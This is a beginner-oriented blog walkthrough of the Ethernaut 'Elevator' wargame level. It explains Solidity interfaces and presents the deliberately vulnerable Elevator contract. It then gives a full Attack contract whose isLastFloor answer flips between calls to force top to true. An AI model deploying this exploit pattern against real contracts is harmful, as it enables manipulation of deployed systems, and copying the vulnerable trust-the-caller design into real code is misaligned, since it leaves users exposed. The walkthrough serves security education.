---
title: "Ethernaut - Walkthrough for Noobs - 11 - Elevator"
datePublished: Sat Mar 25 2023 19:35:27 GMT+0000 (Coordinated Universal Time)
cuid: clfodfhvj000109jx9wf0hh4p
slug: ethernaut-walkthrough-for-noobs-11-elevator
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1679599070503/db5e1737-e4bb-4079-ac0a-b001d19ae79a.jpeg
tags: ethereum, solidity, smart-contracts, 2articles1week, ethernaut

---

This challenge teaches us about interfaces and gives us some important lessons while working on smart contracts: Prevention is better than cure and never trust external actors blindly while writing your contracts.

> Our objective is to make the elevator reach the top floor or set the `top` to `true`.

### Background

If you know object-oriented programming, you must have come across the concept of Interfaces and abstract classes. To explain their use case, think of a light switch. When you turn on the switch, do you care about all the electrical processes going behind it? You probably care about the fact that it turns on the light.

Interfaces and abstract classes are similar in that sense, they will give you an "interface" to access and use functions in other contracts. In essence, they, allow for extensibility when building larger applications.

A crucial difference between Interfaces and abstract classes is that Interfaces can only declare functions whereas abstract classes can implement them as well.

For Ex:

```solidity
interface IExample {
    // can declare, cannot implement
    function random() external returns (bool);
}

abstract contract Example {
    // can declare
    function random() virtual external returns (bool);

    // can implement a well 
    function random23() external pure returns (uint8) {
        return 23;
    }
}
```

But while using these "external actors" how can we be sure that the function we call will do exactly as they say, or that they are not upgradeable/changeable?

In this challenge, we will see such a problem and how important it is to install safeguards in your own contract and/or use code from verified sources only.

### Code of Importance

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building { //interface
  function isLastFloor(uint) external returns (bool); //returns a boolean and "potentially gives us the last floor in the building"
}


contract Elevator {
  bool public top; //gives a boolean, that will state whether we are at the top of the building. false by default. 
  uint public floor; //gives us an integer indicating the floor number, initialised to 0 by default. 

  function goTo(uint _floor) public { //function, takes the floor number as input. 
    Building building = Building(msg.sender); //creates an instance of the Building interface and goTo is expecting to get called by another contract(msg.sender) that has the implementation of `Builiding` interface. 

    if (! building.isLastFloor(_floor)) { //if the floor is not last, the condition would return true, coz of the double negative. 
      floor = _floor; //sets floor as the input entered. 
      top = building.isLastFloor(floor); // should set the top as false, otherwise it wouldn't have been possible to enter the if statement. 
    }
  }
}
```

Exploit: We have to enter the `if` statement in the `goTo` function, and also set `top` to true simultaneously, which seems preposterous, I mean how can a statement be true and false at the same time for the same value?

Actually, the implementation is quite simple. Here is how we would attack this.

1. Create a contract with an implementation of the Building interface, i.e. should have the function `isLastFloor`.
    
2. `isLastFloor` should return false when called the first time and return true, when called the second time.
    

### Solution

1. Open Remix and create an attack.sol file.
    
2. ```solidity
    // SPDX-License-Identifier: MIT
    
    pragma solidity ^0.8.17;
    
    interface IElevator { //interface for the Elevator contract
        function goTo(uint _floor) external;
    }
    
    contract Attack{
        bool secondCall = false; //sets a bool to check for a second call
    
        function isLastFloor(uint) external returns (bool) { //implementation of the isLastFloor
            if(secondCall) { //does not check on the first call. 
                return true;
            }
            secondCall = true; //sets secondcall to true, will help check the if statement in the second call. 
            
            return false; //returns false the first time. 
        }
    
        function attack(address _contractAddress) external { //creates an elevator instance 
            IElevator elevator = IElevator(_contractAddress);
    
            elevator.goTo(23); //call the goTo function and pass any uint you want. 
    
        }
    }
    ```
    
3. ```javascript
    await contract.top() //check if top === true.
    ```
    
4. Submit Instance.
    

Elevator[🛗](https://emojipedia.org/elevator/)